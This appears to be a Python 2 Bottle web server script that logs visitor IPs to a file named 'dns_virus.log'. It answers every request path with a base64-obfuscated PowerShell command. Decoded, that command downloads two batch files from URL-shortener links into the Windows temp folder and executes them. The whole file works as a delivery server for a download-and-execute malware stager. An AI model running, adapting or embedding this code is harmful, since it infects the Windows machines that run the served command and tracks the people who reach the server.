# -*- coding:utf-8 -*-

from bottle import *
import logging
import json

class Logger():

    def __init__(self, logname, loglevel, logger):
        '''
            指定保存日志的文件路径，日志级别，以及调用文件
            将日志存入到指定的文件中
        '''

        # 创建一个logger
        self.logger = logging.getLogger(logger)
        self.logger.setLevel(logging.DEBUG)

        # 创建一个handler，用于写入日志文件
        fh = logging.FileHandler(logname)
        fh.setLevel(logging.DEBUG)

        # 再创建一个handler，用于输出到控制台
        ch = logging.StreamHandler()
        ch.setLevel(logging.DEBUG)

        # 定义handler的输出格式
        formatter = logging.Formatter(
            '%(asctime)s %(filename)s [line:%(lineno)d] %(levelname)s %(message)s')
        # formatter = self.format_dict[int(loglevel)]
        fh.setFormatter(formatter)
        ch.setFormatter(formatter)

        # 给logger添加handler
        self.logger.addHandler(fh)

        self.logger.addHandler(ch)

    def getlog(self):
        return self.logger

logger=Logger(logname='./dns_virus.log', loglevel=1, logger="dnsvirus").getlog()

ps="""
Invoke-Expression ([System.Text.UnicodeEncoding]::Unicode.GetString([Convert]::FromBase64String("DQAKACQAZAAgAD0AIAAiACQAZQBuAHYAOgB0AGUAbQBwAFwAcgBlAG0AbwB2AGUAXwByAGEAbgBkAG8AbQBfADQAMwA3AC4AYgBhAHQAIgA7ACQAYwAxAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAxAC4ARABvAHcAbgBs
AG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAcwA6AC8ALwBkAHcAegAuAGMAbgAvAEcAdgByADUAVwAwAE0AcAAiACwAJABkACkAOwAkAGQAZQBzACAAPQAgACIAJABlAG4AdgA6AHQAZQBtAHAAXAByAGUAbQBvAHYAZQBfAHIAYQBuAGQAbwBtAC4AYgBhAHQAIgA7ACQAYwA9AE4AZQB3AC0ATwBiAGoA
ZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcABzADoALwAvAGQAdwB6AC4AYwBuAC8AZQA0AGUAMgBOAGMAcwBuACIALAAkAGQAZQBzACkAOwBpAG4AdgBvAGsAZQAtAGUAeABwAHIAZQBz
AHMAaQBvAG4AIAAtAGMAbwBtAG0AYQBuAGQAIAAkAGQAZQBzADsAaQBuAHYAbwBrAGUALQBlAHgAcAByAGUAcwBzAGkAbwBuACAALQBjAG8AbQBtAGEAbgBkACAAJABkADsA")));
"""

@route('/<n:path>',method=["POST","GET"])
def powershell(n):
    logger.info(json.dumps({"IP":request.remote_addr,"Path":n}))
    return ps

@route('/')
def index():
    logger.info(json.dumps({"IP": request.remote_addr, "Path": "/"}))
    return ps




if __name__ == '__main__':
    try:
        run(host='0.0.0.0',port=80)
    except Exception,e:
        print e
